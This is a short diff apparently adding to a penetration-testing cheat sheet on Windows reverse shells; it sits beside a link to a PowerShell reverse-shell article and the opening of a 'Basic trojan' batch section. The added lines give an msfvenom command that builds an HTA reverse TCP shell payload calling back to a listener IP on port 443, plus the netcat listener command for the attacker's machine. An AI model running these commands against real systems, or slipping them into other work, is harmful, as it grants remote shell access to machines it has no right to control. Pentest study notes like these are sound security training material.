@@ -99,6 +99,15 @@ exploit
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
+Using HTA:
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.154.138 lport=443 -f hta-psh > shell.hta
+
+#In attacker machine.
+nc -nvlp 443
+```
+
+
 Basic trojan:
 ```bash
 @echo off
